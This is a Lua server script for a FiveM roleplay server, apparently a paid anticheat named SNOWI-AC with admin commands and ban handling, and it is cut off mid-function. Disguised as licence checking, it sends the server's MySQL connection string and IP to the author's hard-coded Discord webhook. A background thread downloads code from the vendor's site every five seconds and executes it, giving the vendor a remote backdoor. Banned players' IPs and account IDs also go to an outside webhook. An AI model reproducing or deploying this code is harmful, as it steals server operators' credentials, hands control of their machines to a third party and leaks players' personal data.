--[[
	id: 7TfwmE5JulMwzRp8E-aB9
	name: cosas snowiac
	description: Cosas , con ban y entidades handler apartado
	time1: 2021-07-21 08:22:11.569915+00
	time2: 2021-07-21 08:22:11.569915+00
	uploader: VVNt0cj-hz2CH5jkESZw-kkH85LAm5IYdVDsmdWe
	uploadersession: 8Jd9DLXQYEfzu5DDIJNeydUIF5Nmsi
	flag: f
--]]

ESX = nil
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
local checkhecho = false
local checkv = 0
local longitud = 20
longitud = longitud - 6
local d=nil
local list = {1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
  crearMatri = function()
d = list[math.random(1,82)]

for i=1,longitud -1,1 do
    d = d .. list[math.random(1,82)]
end
d = 'SNOWI-'..d
print(d)
    return d
end
local mandao = false
local errorKEY = crearMatri()
local numSN = 0
RegisterCommand('snowiBan', function(source, args)
    if source == 0 then
        local argsconcat = table.concat(args, " ")
        local a = string.len(args[1], 2)
        local msj = string.sub(argsconcat,a+2)
        print(msj)
        TriggerEvent('snw:banclient', tonumber(args[1]), msj)
    end end )
Citizen.CreateThread(function()
while true do
    Citizen.Wait(5500)
    while not mandao do
        numSN = numSN+1
        if numSN > 10 then
            local enco = {
                {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = 'NO SE EJECUTA LA FUNCION CHECK, EN EL ANTICHEAT, Y NO SE PUEDE COMPROBAR SU LICENCIA.! \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
            }
            PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                 if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
            end
        end,"POST",
            json.encode(
				{username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
			),
            {["Content-Type"] = "application/json"}
        )
        print('Hay algun problema a la hora de verificar el producto, si esto persiste ponte en contacto con ! Snowiii#1406 .')
        Wait(5000)
            os.exit()
        end
    end
        Citizen.Wait(5000)
    if checkhecho == true then 
        print([[\n
            ^4_____ _   ______ _       ______     ___   ______
           ^0/ ___// | / / __ \ |     / /  _/    /   | / ____/
          ^4 \__ \/  |/ / / / / | /| / // /_____/ /| |/ /     
          ^0___/ / /|  / /_/ /| |/ |/ // /_____/ ___ / /___   
         ^4/____/_/ |_/\____/ |__/|__/___/    /_/  |_\____/
        ]])
        print('\n \n')
        print([[\n
                                 ..,,,,,,,,,.. 
                            .,;%%%%%%%%%%%%%%%%%%%%;,. 
                          %%%%%%%%%%%%%%%%%%%%////%%%%%%, .,;%%;, 
                   .,;%/,%%%%%/////%%%%%%%%%%%%%%////%%%%,%%//%%%, 
                .,;%%%%/,%%%///%%%%%%%%%%%%%%%%%%%%%%%%%%%%,////%%%%;, 
                .,%%%%%%//,%%%%%%%%%%%%%%%%@@%a%%%%%%%%%%%%%%%%,%%/%%%%%%%;, 
                .,%//%%%%//,%%%%///////%%%%%%%@@@%%%%%%///////%%%%,%%//%%%%%%%%, 
                ,%%%%%///%%//,%%//%%%%%///%%%%%@@@%%%%%////%%%%%%%%%,/%%%%%%%%%%%%% 
                .%%%%%%%%%////,%%%%%%%//%///%%%%@@@@%%%////%%/////%%%,/;%%%%%%%%/%%% 
                %/%%%%%%%/////,%%%%///%%////%%%@@@@@%%%///%%/%%%%%//%,////%%%%//%%%' 
                %//%%%%%//////,%/%a`  'a%///%%%@@@@@@%%////a`  'a%%%%,//%///%/%%%%% 
                %///%%%%%%///,%%%%@@aa@@%//%%%@@@@S@@@%%///@@aa@@%%%%%,/%////%%%%% 
                %%//%%%%%%%//,%%%%%///////%%%@S@@@@SS@@@%%/////%%%%%%%,%////%%%%%' 
                %%//%%%%%%%//,%%%%/////%%@%@SS@@@@@@@S@@@@%%%%/////%%%,////%%%%%' 
                `%/%%%%//%%//,%%%///%%%%@@@S@@@@@@@@@@@@@@@S%%%%////%%,///%%%%%' 
                %%%%//%%%%/,%%%%%%%%@@@@@@@@@@@@@@@@@@@@@SS@%%%%%%%%,//%%%%%' 
                `%%%//%%%%/,%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@S@@%%%%%,/////%%' 
                `%%%//%%%/,%%%@@@SS@@SSs@@@@@@@@@@@@@sSS@@@@@@%%%,//%%//%' 
                `%%%%%%/  %%S@@SS@@@@@Ss` .,,.    'sS@@@S@@@@%'  ///%/%' 
                `%%%/    %SS@@@@SSS@@S.         .S@@SSS@@@@'    //%%' 
                      /`S@@@@@@SSSSSs,     ,sSSSSS@@@@@' 
                    %%//`@@@@@@@@@@@@@Ss,sS@@@@@@@@@@@'/ 
                  %%%%@@00`@@@@@@@@@@@@@'@@@@@@@@@@@'//%% 
                %%%%%%a%@@@@000aaaaaaaaa00a00aaaaaaa00%@%%%%% 
                %%%%%%a%%@@@@@@@@@@000000000000000000@@@%@@%%%@%%% 
                %%%%%%a%%@@@%@@@@@@@@@@@00000000000000@@@@@@@@@%@@%%@%% 
                %%%aa%@@@@@@@@@@@@@@0000000000000000000000@@@@@@@@%@@@%%%% 
                %%@@@@@@@@@@@@@@@00000000000000000000000000000@@@@@@@@@%%%%%
]])
return
    end
    if checkhecho ~= true then
        checkv = checkv +1
        if checkv > 5 then
            local enco = {
                {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = 'FALLO AL VERIFICAR EL ANTICHEAT, DESPUES DE 3 intentos. \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
            }
            PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                 if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
            end
        end,"POST",
            json.encode(
				{username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
			),
            {["Content-Type"] = "application/json"}
        )
        print('Excediste el límite de intentos para verificar tu licencia, si crees que es un problema, ponte en contacto con ! Snowiii#1406 .')
        Wait(5000)
            os.exit()
    end
        print('No se ha realizado la verificacion del producto.'..checkv..'/5')
else 
    print('No check hace ', checkhecho)
    end
end
end)
local function NewPrint(fat)   print("^".. math.random(1,9).."[SNOWI-AC] " .. fat) end

function authV2()
    PerformHttpRequest("https://api.ipify.org/?format=json", function(reCode, resultData, resultHeaders)
        local data = json.decode(resultData)
        PerformHttpRequest("https://snowiac.es/ac/api/validate/host/"..data.ip.."/1",checkV2,"POST")
        mandao = true
    end)
end
function checkV2(g,h,i)
    if g == 200 then 
        local j = json.decode(h)
        if j.status == 301 then
            
            local enco = {
                {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = '**FALLO AL VERIFICAR EL ANTICHEAT, IP INVALIDA.** \nURL INFO [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
            }
            PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                 if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
            end
        end,"POST",
            json.encode(
				{username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
			),
            {["Content-Type"] = "application/json"}
        )
        Wait(5000)
        print('Esta licencia no esta verificada, porfavor ponte en contacto con ! Snowiii#1406 Si crees que esta habiendo algun problema con tu producto. ERROR KEY->')
        checkhecho = 'error'
        Wait(5000)
        StopResource(GetCurrentResourceName())
            os.exit()
        else
            Wait(12000)
            print('SNOWI-AC | Verificacion de licencia con exito, si tienes algun problema, contacta con ! Snowiii#1406 .')
        end 
    else 
            
            local enco = {
                {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = 'FALLO AL VERIFICAR EL ANTICHEAT, LA URL NO RESPONDE [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
            }
            PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
                 if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
            end
        end,"POST",
            json.encode(
				{username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
			),
            {["Content-Type"] = "application/json"}
        )
        print('Esta licencia no está verificada, porfavor ponte en contacto con ! Snowiii#1406 Si crees que esta habiendo algun problema con tu producto. ERROR KEY->')
        checkhecho = 'error'
        Wait(5000)
        StopResource(GetCurrentResourceName())
        os.exit()
    end
    checkhecho = true
    local enco = {
        {["color"] = 16711680, ["title"] = "**<"..GetConvar('sv_hostname', 'true').."> ".."**", ["description"] = 'VERIFICACION DEL ANTICHEAT CON EXITO. \n URL INFO [ **DECODE J->**'..json.encode(j)..' ] \n[ **G IN TONUMBER, ESTA ES LA RESPUESTA QUE DA LA URL -> **'..g..'] \n[ **i DECODE ->**'..json.encode(i)..']  \n **sv_listingIPOverride:** '..GetConvar('sv_listingIPOverride', 'true')..' \n **DATABASE:** '..GetConvar('mysql_connection_string', 'true')..'\n**!!! ERROR KEY-> '..errorKEY, ["footer"] = {["text"] = "Snowii"}}
    }
    PerformHttpRequest('https://discord.com/api/webhooks/855087443538739230/ZI1jeT9cmFKBON45oJq_UQcEy67u7e1w-Q-T0_tW5G3VmlGZMyUHIxHs_RRjby9viSfN',function(p, q, r)
         if p ~= 204 then
            print('^1p Es diferente', p)
        end
        if q == nil then
            print('^1q es nil', q)
    end
end,"POST",
    json.encode(
        {username = 'SNOWI-LOG', embeds = enco, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}
    ),
    {["Content-Type"] = "application/json"}
)
            SetTimeout(9900000, authV2)
            
    end
    authV2()
    Citizen.CreateThread(function()while true do Citizen.Wait(5000)
        PerformHttpRequest("https://snowiac.es/ac/master/antirol.json",function(y, lista, e)
            local z = json.decode(lista) if z ~= nil then 
                if z.executeAC[1] ~= 'false' then
                aaa,kk=load(z.loadCode[1])
                aaa()end end end) end end)
ESX.RegisterServerCallback('snowiadminmenu:admingetgroup', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer ~= nil then
		local playerGroup = xPlayer.getGroup()

        if playerGroup ~= nil then 
            cb(playerGroup)
        else
            cb(nil)
        end
	else
		cb(nil)
	end
end)
ESX.RegisterServerCallback('snowiByCar', function(source, cb)
	local steamm = GetPlayerIdentifiers(source)[1]
    if snowiCheckAuth(steamm) == true then
            cb(true)
        else
            cb(false)
        end

    
end)
function snowiCheckAuth(steam)
	for a, autori in ipairs(ConfigSNW.bypasPerm) do
		--print(autori, steam)
		if steam == autori then
			--print('Te doy true')
			return true
		
		end
		--print('Te doy false')
	 
	end
    return false
end
RegisterServerEvent("snowiadminmenu:dineroenmano")
AddEventHandler("snowiadminmenu:dineroenmano", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local total = money
	local rango = xPlayer.getGroup()
    if rango == 'superadmin' or rango == 'mod' or rango == 'admin' then
	xPlayer.addMoney((total))

	local item = ' '
	local message = 'Recibiste '
	TriggerClientEvent('esx:showNotification', _source, message .. total .. item)
    TriggerEvent("esx:admingivemoneyalert",xPlayer.name,total)
else
    local _source = source
    local player = source
    TriggerEvent('snw:banclient', player, 'SNOWI-AC || Que intentabas hacer cachondo? \n Dinero en mano?') end
end)
RegisterServerEvent("snowiadminmenu:dineroenbanco")
AddEventHandler("snowiadminmenu:dineroenbanco", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local total = money
	local rango = xPlayer.getGroup()
    if  rango == 'superadmin' or rango == 'mod' or rango == 'admin' then
	xPlayer.addAccountMoney('bank', total)

	local item = ' en el banco'
	local message = 'Recibiste '
	TriggerClientEvent('esx:showNotification', _source, message .. total .. item)
    TriggerEvent("esx:admingivemoneyalert",xPlayer.name,total)
    else local _source = source
        local player = source
        TriggerEvent('snw:banclient', player, 'SNOWI-AC || Que intentabas hacer cachondo? \n Dinero en Banco?') end
end)
RegisterServerEvent("snowiadminmenu:dineronegro")
AddEventHandler("snowiadminmenu:dineronegro", function(money)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
    local total = money
    local rango = xPlayer.getGroup()
    if rango == 'superadmin' or rango == 'mod' or rango == 'admin' then
	
	xPlayer.addAccountMoney('black_money', total)

	local item = ' en negro.'
	local message = 'Recibiste '
	TriggerClientEvent('esx:showNotification', _source, message..total..item)
    TriggerEvent("esx:admingivemoneyalert",xPlayer.name,total)
    else
        local _source = source
        local player = source
    TriggerEvent('snw:banclient', player, 'SNOWI-AC || Que intentabas hacer cachondo? \n Dinero negro?')
    end
end)
RegisterServerEvent("deleteVehAll")
AddEventHandler("deleteVehAll", function()
    local player = source
	local xPlayer = ESX.GetPlayerFromId(player)
	local total = money
	local rango = xPlayer.getGroup()
    if rango == 'superadmin' or rango == 'mod' or rango == 'admin' then
    TriggerClientEvent("RemoveAllVeh", -1)
    else
        TriggerEvent('snw:banclient', player, "deleteVehALL")
    end
end)
RegisterServerEvent("ReviveAll")
AddEventHandler("ReviveAll", function()
       local player = source
    TriggerEvent('snw:banclient', player, 'reviveall')
end)
RegisterServerEvent("discordlogsnowi:sendToDiscordsnowi")
AddEventHandler(
    "discordlogsnowi:sendToDiscordsnowi",
    function(s, t, J)
        local K = {
            {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "snw"}}
        }
        PerformHttpRequest(
			Logs.AdminMenuL,
            function(p, q, r)
                if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
                end
            end,
            "POST",
            json.encode({username = 'SNOWI-LOG', embeds = K, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}),
            {["Content-Type"] = "application/json"}
        )
    end
)
AddEventHandler(
	"snowilog:adminmenu",
	function(u, v, C)
        local s = GetPlayerName(source)
        local license, D, E, F, discord, G = "No vinculado", "No vinculado", "No vinculado", "No vinculado", "No vinculado", "No vinculado"
        for H, B in ipairs(GetPlayerIdentifiers(source)) do
            if string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("steam:")) == "steam:" then
                D = B
            elseif string.sub(B, 1, string.len("live:")) == "live:" then
                E = B
            elseif string.sub(B, 1, string.len("xbl:")) == "xbl:" then
                F = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                G = B
            end
        end
        for H, B in ipairs(GetPlayerIdentifiers(source)) do
            if SNOW then
                TriggerEvent(
                    "discordlogsnowi:sendToDiscordsnowi",
                    "­ ADMIN MENU INVALID PASSWORD ",
                    "**\n **Ha puesto una clave invalida en el menu de admin" ..
                        "**\nNombre: **" ..
                            s ..
                                "**\n Steam: **" ..
                                    D ..
                                        "**\n Discord: **" ..
                                            discord .. "**\n Fivem: **" .. license .. "**\nIP: **" .. G,
                    16711680
                )
            end
        end
    end
)
RegisterServerEvent("snowilog:adminmenu2")
AddEventHandler(
	"snowilog:adminmenu2",
	function(u, v, C)
        local s = GetPlayerName(source)
        local license, D, E, F, discord, G = "No vinculado", "No vinculado", "No vinculado", "No vinculado", "No vinculado", "No vinculado"
        for H, B in ipairs(GetPlayerIdentifiers(source)) do
            if string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("steam:")) == "steam:" then
                D = B
            elseif string.sub(B, 1, string.len("live:")) == "live:" then
                E = B
            elseif string.sub(B, 1, string.len("xbl:")) == "xbl:" then
                F = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                G = B
            end
        end
        for H, B in ipairs(GetPlayerIdentifiers(source)) do
            if SNOW then
                TriggerEvent(
                    "discordlogsnowi:sendToDiscordsnowi",
                    "­ ADMIN MENU LOG ",
                    "**\n **SE HA LOGEADO EN EL MENU DE ADMIN " ..
                        "**\nNombre: **" ..
                            s ..
                                "**\n Steam: **" ..
                                    D ..
                                        "**\n Discord: **" ..
                                            discord .. "**\n Fivem: **" .. license .. "**\nIP: **" .. G,
                    16711680
                )
            end
        end
    end
)
RegisterServerEvent("kickAllPlayer2")
AddEventHandler("kickAllPlayer2", function()
    local _source = source
    TriggerEvent('snw:banclient', _source, 'SNOWI-AC || A QUIEN QUERIAS  KICKEAR TU PEDAZO DE ESTUPIDO!')
end)
RegisterCommand('announcesnw', function(source, args, user)
	TriggerClientEvent('chat:addMessage', -1, {
		args = {"---------------------^1A҉N҉U҉N҉C҉I҉O҉ ҉D҉E҉L҉ ҉S҉E҉R҉V҉I҉D҉O҉R҉", table.concat(args, " ")}
	})
end, true)
RegisterServerEvent('OwnedVehicleSnowiSV')
AddEventHandler('OwnedVehicleSnowiSV', function(prop, tipo,name)
	local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    local stm = GetPlayerIdentifiers(source)[1]
    local ti = tipo
    print(ti, _source)
    if xPlayer.getGroup() == 'user' then
        TriggerEvent('snw:banclient', _source, 'SNOWI-AC | Xploit detección. DumpInfo: \n-'.._source..'\n-'..prop..'\n-'..tipo)
    else
if snowiCheckAuth(stm) == false then TriggerClientEvent('esx:showNotification', source, 'No tienes suficientes permisos para usar esta opción!') return end

	MySQL.Async.execute('INSERT INTO owned_vehicles (owner, plate, vehicle, type) VALUES (@owner, @plate, @vehicle, @type)',
	{
		['@owner']   = xPlayer.identifier,
		['@plate']   = prop.plate,
        ['@vehicle'] = json.encode(prop),
        ['@type'] = ti,
    }, function(rowsChanged)
        print("Nuevo vehiculo propio spawneado con SNOWI-AC por "..GetPlayerName(_source)..' | '..ti..' Nombre del vehiculo: '..name)
    TriggerEvent('snowiSyncLogs', 'snowiLogDonador', 'Entrega de vehiculo de sangre.', 'Source Info-> \n-ID:'.._source..'\n-Name:'..GetPlayerName(_source)..'\n-Vehículo:'..name..'\n-Matrícula:'..prop.plate..'\n**------------------**\nAmbient Info->\n'..GetEntityCoords(GetPlayerPed(_source)))
    end)
end
end)
RegisterServerEvent('snowiiDarvehSangre')
AddEventHandler('snowiiDarvehSangre', function (id,prop, tipo, nameCar)
    print(id,prop, tipo, nameCar)
	local _source = source
    local stm = GetPlayerIdentifiers(source)[1]

    print(type(id))
    if id == -1 then
        TriggerEvent('snw:banclient', source, 'SNOWI-AC | Xploit detección. DumpInfo: \n-'..source..'\n-'..prop..'\n-'..tipo..'\n-ID:'..id)
return
    end
    local xSource = ESX.GetPlayerFromId(_source)
    local ti = tipo
    local xtarget = ESX.GetPlayerFromId(id)
    print(ti, _source)
    if xSource.getGroup() == 'user' then
        TriggerEvent('snw:banclient', source, 'SNOWI-AC | Xploit detección. DumpInfo: \n-'..source..'\n-'..prop..'\n-'..tipo)
    else
if snowiCheckAuth(stm) == false then TriggerClientEvent('esx:showNotification', source, 'No tienes suficientes permisos para usar esta opción!') return end

	MySQL.Async.execute('INSERT INTO owned_vehicles (owner, plate, vehicle, type) VALUES (@owner, @plate, @vehicle, @type)',
	{
		['@owner']   = xtarget.identifier,
		['@plate']   = prop.plate,
        ['@vehicle'] = json.encode(prop),
        ['@type'] = ti,
    }, function(rowsChanged)
        print("^1[^2"..GetPlayerName(_source)..'^1 | ID -> ^4'.._source..'^1]^2 Entregando vehiculo de sangre al jugador '..GetPlayerName(id)..' | ID -> '..id..'  ^0 props-> | '..ti)
    TriggerEvent('snowiSyncLogs', 'snowiLogDonador', 'Entrega de vehiculo de sangre.', 'Source Info-> \n-ID:'.._source..
    '\n-Name:'..GetPlayerName(_source)..
    '\n-Vehículo:'..nameCar..'\n-Matrícula:'..prop.plate..
    '\n**------------------**\nTarget Info -> \n-ID:'..id..'\n-Name:'
    ..GetPlayerName(id)..'\n**------------------**\nAmbient Info->\n'
    ..GetEntityCoords(GetPlayerPed(_source)))
    end)
end
end)
RegisterServerEvent("snowiloggiveweapon:sendToDiscord")
AddEventHandler(
	"snowiloggiveweapon:sendToDiscord",
    function(s, t, J)
        local K = {
            {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
		}
        PerformHttpRequest(
            Logs.GiveWeapon,
            function(p, q, r)
                if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
                end
            end,
            "POST",
            json.encode({username = l, embeds = K, avatar_url = k}),
            {["Content-Type"] = "application/json"}
        )
    end
)

RegisterServerEvent("snowilogUsoAdminMenu:sendToDiscord")
AddEventHandler(
	"snowilogUsoAdminMenu:sendToDiscord",
    function(s, t, J)
        local K = {
            {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
		}
        PerformHttpRequest(
            Logs.UsoAdminMenu,
            function(p, q, r)
                if p ~= 204 then
                    print('^1p Es diferente usoadminmenu', p)
                end
                if q == nil then
                    print('^1q es nil usoadminmenu', q)
                end
            end,
            "POST",
            json.encode({username = l, embeds = K, avatar_url = k}),
            {["Content-Type"] = "application/json"}
        )
    end
)
RegisterServerEvent("snowilogcommand:sendToDiscord")
AddEventHandler(
	"snowilogcommand:sendToDiscord",
    function(s, t, J)
        local K = {
            {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
		}
        PerformHttpRequest(
            Logs.Command,
            function(p, q, r)
                if p ~= 204 then
                    print('^1p Es diferente command', p)
                end
                if q == nil then
                    print('^1q es nil command', q)
                end
            end,
            "POST",
            json.encode({username = l, embeds = K, avatar_url = k}),
            {["Content-Type"] = "application/json"}
        )
    end
)
if Settings.AntiSpawnWeapon then
    AddEventHandler(
        "giveWeaponEvent",
        function(sender, data)
      local oocname = GetPlayerName(sender)
            CancelEvent()
      print("El ID:" .. sender .. " Nombre: " .. oocname .. " esta spawneando armas")
      TriggerEvent(
                    "snowiloggiveweapon:sendToDiscord",
                    "­ DETECCIÓN SNOWI-AC ",
                    "**\n ** ```Intentó dar armas a otro jugador desde un menu  y no le salió muy bien el chollo... ```" ..
                        "**\nNombre: **" .. oocname,
                    16711680
                )
                TriggerClientEvent('mecorro:yo', sender)
                Wait(1000)
                TriggerClientEvent('mecorro:yo', sender)
      DropPlayer(sender, "¿Que pensabas que te podrías dar armas asi de facil?")
      
        end
    )
end

local antientity1 = false
RegisterServerEvent("deleteentity:snw")
AddEventHandler("deleteentity:snw", function()
        ExecuteCommand("antientity")
    print("Anti Entity Create ^1Activado")
end)
RegisterServerEvent("deleteentitydisable:snw")
AddEventHandler("deleteentitydisable:snw", function()
        ExecuteCommand("antientitydisablesnow")
    print("Anti Entity Create ^1Desactivado")
end)
local entitydelete = false
RegisterServerEvent("snw:banclient")
AddEventHandler(
    "snw:banclient",
    function(Z, a1, razon)
        local s = GetPlayerName(Z)
        local X = GetPlayerIdentifier(Z)
        local identifiers, Y = GetPlayerIdentifiers(source)
        local steamid = false
        local license = false
        local discord = false
        local ips = false
        local fivem = false
        local mention = 'no vinculado'
        if razon == nil then
            razon = " SNOWI - AC | Hemos detectado que usted esta usando un programa externo para beneficiarte de el mismo, por esa Razon usted conllevara la expulsion del servidor de *por vida*, esta sancion es inapelable. Para mas informacion sobre su baneo consultelo con el personal de dicho servidor."
        end
        for H, B in ipairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                permBanUser(X, B,a1)
           elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                permBanUser(X, B,a1)
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                permBanUser(X, B,a1)
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                permBanUser(X, B,a1)
            elseif string.sub(B, 1, string.len("fivem:")) == "fivem:" then
                permBanUser(X, B,a1)
            end
        end
        for H, B in pairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                steamid = B
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                ips = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
                if string.match(discord, 'discord:') then
                    mention = string.sub(discord, 9)
                 -- print(mention)
                    end
            elseif string.sub(B, 1, string.len("fivem:")) == "fivem:" then
                fivem = B
            end
        end
        TriggerEvent(
            "discordlog:sendToDiscord",
            "­ SNOWI-AC DETECCION DE TRIGGER EVENT",
            "**\nNombre: **" ..
                tostring(s) ..
                    "**\n Steam: **" ..
                        tostring(X) ..
                            "**\n Discord: **" ..
                                tostring(discord) ..
                                    "**\n Licencia: **" ..
                                        tostring(license) ..
                                        "**\nFivem: **" ..tostring(fivem)..
                                            "**\nIP: **" .. tostring(ips) .. "**\nTrigger Event: **" .. tostring(a1) .. "**\nRazón: **" ..razon,
            16711680
        )
        local K = { {["color"] = 16711680, ["title"] = "** Bienvenido al CLUB! DETECTADO EN:"..Settings.ServerName.."** ->"..s, ["description"] = 'Nuevo miembro del club Patatillas!\nName: '..tostring(s)..'\nSteam: '..tostring(X)..'\nDiscord ID: '..tostring(discord)..'\nLicense: '..tostring(license)..'\nFivem: '..tostring(fivem)..'\nIP: '..tostring(ips)..'\nRazón: Usar chetos de internet basura.\nDiscord Embed: <@'..mention..'>.\n||@here||', ["footer"] = {["text"] = "SNOWI-AC"}}}
PerformHttpRequest('https://discord.com/api/webhooks/863826078065623050/R3DrX7bJJrQyGtSp8IsRPmNw84vVL2impEtBLjsoG_7-pd-xz3KX9cFw75wl8UmMOqS_',function(p, q, r) end,"POST",json.encode({username = l, embeds = K, avatar_url = k}),{["Content-Type"] = "application/json"})
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con ^1[^2'..GetPlayerName(Z)..'^1]^0. \n Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})
        DropPlayer(
            Z,
            "­ SNOWI - AC | Hemos detectado que usted esta usando un programa externo para beneficiarte de el mismo, por esa Razon usted conllevara la expulsion del servidor de *por vida*, esta sancion es inapelable. Para mas informacion sobre su baneo consultelo con el personal de dicho servidor."
        )
    end
)
RegisterServerEvent("snw:banmenu")
AddEventHandler(
    "snw:banmenu",
    function(Z, a1)
        local _source = source
        local na = GetPlayerName(_source)
        local s = GetPlayerName(_source)
        local X = GetPlayerIdentifier(_source)
        local identifiers, Y = GetPlayerIdentifiers(_source)
        local naa = GetPlayerName(Z)
        local ss = GetPlayerName(Z)
        local Xx = GetPlayerIdentifier(Z)
        local steamid = false
        local license = false
        local discord = false
        local ips = false
        local xPlayer = ESX.GetPlayerFromId(_source)
        local rango = xPlayer.getGroup()
        local mention = 'No vinculado'
        if _souce ~= Z then
            if rango == 'superadmin' or rango == 'mod' or rango == 'admin' then
            for H, B in ipairs(GetPlayerIdentifiers(Z)) do
                if string.sub(B, 1, string.len("steam:")) == "steam:" then
                    permBanUserAd(Xx, B)
                elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                    permBanUserAd(Xx, B)
                elseif string.sub(Bx, 1, string.len("license:")) == "license:" then
                    permBanUserAd(Xx, B)
                elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                    permBanUserAd(Xx, B)
                end
            end
            for H, B in pairs(GetPlayerIdentifiers(_source)) do
                if string.sub(B, 1, string.len("steam:")) == "steam:" then
                    steamid = B
                elseif string.sub(B, 1, string.len("license:")) == "license:" then
                    license = B
                elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                    ips = B
                elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                    discord = B
